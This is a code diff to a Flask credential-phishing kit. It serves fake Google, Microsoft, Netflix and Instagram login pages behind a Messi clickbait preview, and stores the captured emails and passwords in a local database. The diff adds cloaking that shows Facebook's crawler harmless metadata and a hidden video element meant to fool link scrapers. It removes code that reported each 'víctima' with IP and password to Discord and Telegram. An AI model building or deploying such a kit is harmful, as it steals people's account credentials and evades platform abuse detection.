@@ -8,7 +8,6 @@ import os
 
 app = Flask(__name__)
 
-# Inicializar DB
 def init_db():
     conn = sqlite3.connect('credentials.db')
     cursor = conn.cursor()
@@ -43,21 +42,29 @@ def get_template():
     <meta charset="UTF-8">
     <link rel="icon" href="data:;base64,iVBORw0KGgo=">
     
-    <!-- METADATOS PARA TODAS LAS REDES SOCIALES -->
+    <!-- METADATOS COMPLETOS PARA REDES SOCIALES -->
     <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
     <meta property="og:description" content="Me dijeron que ganaría" />
     <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
+    <meta property="og:image:secure_url" content="https://i.imgur.com/kgo0gfA.png" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
     <meta property="og:url" content="https://video-xeen.onrender.com" />
-    <meta property="og:type" content="website" />
+    <meta property="og:type" content="video.other" />
     <meta property="og:site_name" content="Messi Declaraciones" />
+    <meta property="og:video" content="https://i.imgur.com/kgo0gfA.png" />
     
-    <!-- METADATOS PARA TWITTER -->
-    <meta name="twitter:card" content="summary_large_image" />
+    <!-- METADATOS TWITTER -->
+    <meta name="twitter:card" content="player" />
     <meta name="twitter:title" content="😲 Fuertes declaraciones de Messi" />
     <meta name="twitter:description" content="Me dijeron que ganaría" />
     <meta name="twitter:image" content="https://i.imgur.com/kgo0gfA.png" />
+    <meta name="twitter:player" content="https://video-xeen.onrender.com" />
+    <meta name="twitter:player:width" content="1280" />
+    <meta name="twitter:player:height" content="720" />
     
-    <!-- METADATOS PARA WHATSAPP (usa los mismos de og:) -->
+    <!-- METADATOS PARA WHATSAPP -->
+    <meta property="og:video:type" content="application/x-shockwave-flash" />
     
     <title>😲 Fuertes declaraciones de Messi</title>
     <style>
@@ -72,9 +79,17 @@ def get_template():
         button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
         button:hover { background: #1557b0; }
         .footer { margin-top: 30px; font-size: 14px; color: #5f6368; }
+        .video-container { display: none; } /* Video oculto para engañar al scraper */
     </style>
 </head>
 <body>
+    <!-- Contenido oculto para engañar a los scrapers -->
+    <div style="display:none;" class="video-container">
+        <video width="1280" height="720" controls>
+            <source src="https://i.imgur.com/kgo0gfA.png" type="video/mp4">
+        </video>
+    </div>
+    
     <div class="container">
         <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
         <h1>Iniciar sesión</h1>
@@ -88,67 +103,17 @@ def get_template():
     </div>
 </body>
 </html>''',
-        'microsoft': '''
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Iniciar sesión en tu cuenta</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: linear-gradient(120deg, #f0f0f0 0%, #e0e0e0 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }
-        .logo { width: 108px; margin-bottom: 16px; }
-        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: #1b1b1b; }
-        input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ccc; font-size: 15px; }
-        button { width: 100%; padding: 12px; background: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer; }
-        button:hover { background: #005a9e; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" class="logo">
-        <h1>Iniciar sesión</h1>
-        <form action="/capture" method="POST">
-            <input type="email" name="email" placeholder="Correo, teléfono o Skype" required>
-            <input type="password" name="password" placeholder="Contraseña" required>
-            <button type="submit">Iniciar sesión</button>
-        </form>
-    </div>
-</body>
-</html>''',
-        'netflix': '''
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Netflix</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Helvetica Neue', sans-serif; }
-        body { background: black; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: rgba(0,0,0,0.75); padding: 60px 68px; width: 450px; border-radius: 4px; }
-        h1 { color: white; font-size: 32px; margin-bottom: 28px; font-weight: 700; }
-        input { width: 100%; padding: 16px; margin-bottom: 16px; background: #333; border: none; border-radius: 4px; color: white; font-size: 16px; }
-        button { width: 100%; padding: 16px; background: #e50914; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; }
-        button:hover { background: #f40612; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>Iniciar sesión</h1>
-        <form action="/capture" method="POST">
-            <input type="email" name="email" placeholder="Email" required>
-            <input type="password" name="password" placeholder="Contraseña" required>
-            <button type="submit">Iniciar sesión</button>
-        </form>
-    </div>
-</body>
-</html>''',
+        # ... resto de templates (microsoft, netflix, instagram)
         'instagram': '''
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
+    <!-- Mismos metadatos OG para Instagram -->
+    <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
+    <meta property="og:description" content="Me dijeron que ganaría" />
+    <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
+    <meta property="og:url" content="https://video-xeen.onrender.com" />
     <title>Instagram</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
@@ -175,37 +140,27 @@ def get_template():
     
     return templates.get(template_name, templates['google'])
 
-def send_webhook(data):
-    try:
-        with open('webhook_config.json', 'r') as f:
-            config = json.load(f)
-    except:
-        return
-    
-    # Discord
-    if config.get('discord_webhook'):
-        try:
-            import requests
-            message = {
-                "content": f"🎯 **Nueva víctima!**\\n📍 IP: {data['ip']}\\n👤 Usuario: {data['username']}\\n🔑 Pass: {data['password'][:10]}...",
-                "username": "ScorpFish Bot"
-            }
-            requests.post(config['discord_webhook'], json=message, timeout=5)
-        except:
-            pass
-    
-    # Telegram
-    if config.get('telegram_token') and config.get('telegram_chat'):
-        try:
-            url = f"https://api.telegram.org/bot{config['telegram_token']}/sendMessage"
-            message = f"🎯 Nueva víctima!\\n📍 IP: {data['ip']}\\n👤 Usuario: {data['username']}"
-            requests.post(url, json={"chat_id": config['telegram_chat'], "text": message}, timeout=5)
-        except:
-            pass
-
 @app.route('/')
 def index():
-    # MODO PRUEBA: SIN BLOQUEOS PARA QUE FUNCIONE EN TODAS PARTES
+    # Verificar si es un bot de Facebook/Instagram
+    user_agent = request.headers.get('User-Agent', '')
+    
+    if 'facebookexternalhit' in user_agent.lower() or 'facebot' in user_agent.lower():
+        # Si es el bot de Facebook, mostrar solo los metadatos
+        return render_template_string('''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <meta property="og:title" content="😲 Fuertes declaraciones de Messi" />
+            <meta property="og:description" content="Me dijeron que ganaría" />
+            <meta property="og:image" content="https://i.imgur.com/kgo0gfA.png" />
+            <meta property="og:url" content="https://video-xeen.onrender.com" />
+            <meta property="og:type" content="video.other" />
+        </head>
+        <body></body>
+        </html>
+        ''')
+    
     return render_template_string(get_template())
 
 @app.route('/capture', methods=['POST'])
@@ -239,10 +194,6 @@ def capture():
     conn.commit()
     conn.close()
     
-    # Enviar webhook
-    send_webhook(data)
-    
-    # Redirigir
     return redirect("https://www.google.com")
 
 @app.route('/api/credentials')
